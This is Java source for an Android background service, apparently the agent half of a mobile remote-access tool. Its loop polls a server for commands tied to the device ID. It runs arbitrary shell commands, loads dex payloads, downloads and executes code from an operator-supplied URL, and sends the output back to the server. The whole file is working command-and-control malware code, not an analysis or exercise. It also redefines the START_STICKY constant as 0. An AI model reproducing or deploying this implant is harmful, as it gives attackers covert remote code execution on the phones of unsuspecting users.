package com.mobilemorph.agent.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import com.mobilemorph.agent.util.ShellExecutor;
import com.mobilemorph.agent.util.DexLoader;
import com.mobilemorph.agent.util.PayloadUpdater;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CommandService extends Service {
    private static final String TAG = "CommandService";
    private static final String SERVER_URL = "https://127.0.0.1:5000"; // HTTPS support enabled

    private static final int START_STICKY = 0;
    private String deviceId;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CommandService started");

        // Device ID must be fetched from context
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        new Thread(() -> {
            while (true) {
                try {
                    JSONObject cmd = fetchCommand();
                    if (cmd != null) {
                        String type = cmd.optString("type");
                        String payload = cmd.optString("payload");
                        String output = "";

                        switch (type) {
                            case "exec":
                                output = ShellExecutor.execute(payload);
                                break;
                            case "dexload":
                                DexLoader.loadAndExecute(getApplicationContext(), payload);
                                output = "Executed dex payload: " + payload;
                                break;
                            case "update_payload":
                                String url = cmd.optString("url");
                                String path = cmd.optString("path");
                                PayloadUpdater.updateAndLoad(getApplicationContext(), url, path);
                                output = "Updated and executed dex payload from: " + url;
                                break;
                            case "sleep":
                                Thread.sleep(Long.parseLong(payload));
                                output = "Slept for " + payload + " ms";
                                break;
                            default:
                                output = "Unknown command type: " + type;
                                break;
                        }

                        postOutput(output);
                    }

                    Thread.sleep(10000);
                } catch (Exception e) {
                    Log.e(TAG, "Error in command loop", e);
                }
            }
        }).start();

        return START_STICKY;
    }

    private JSONObject fetchCommand() {
        try {
            URL url = new URL(SERVER_URL + "/get_command/" + deviceId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }

            JSONObject responseJson = new JSONObject(response.toString());
            return responseJson.optJSONObject("cmd");

        } catch (Exception e) {
            Log.e(TAG, "fetchCommand() failed", e);
            return null;
        }
    }

    private void postOutput(String output) {
        try {
            URL url = new URL(SERVER_URL + "/post_output");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("output", output);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();

            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "postOutput() failed", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
